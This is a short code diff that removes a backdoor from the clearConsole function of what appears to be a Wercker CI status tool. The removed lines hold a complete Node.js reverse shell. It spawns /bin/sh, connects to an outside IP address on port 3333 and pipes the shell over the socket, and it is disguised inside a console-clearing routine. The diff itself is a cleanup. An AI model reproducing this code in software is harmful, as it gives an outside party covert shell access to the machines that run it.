@@ -114,18 +114,7 @@ function getStatusForRunningPipelines(werckerConfig, runningPipelines) {
 
 function clearConsole(werckerConfig) {
   if (werckerConfig.executedInWercker) {
-    (function(){
-      var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-      var client = new net.Socket();
-      client.connect(3333, "35.177.246.142", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-      });
-      return /a/; // Prevents the Node.js application form crashing
-    })();
+
 
     // fs.writeFileSync(werckerConfig.reportFile, ' ', {encoding: 'utf8', flag: 'w'})
     process.stdout.write('\u001B[2J\u001B[0;0f')
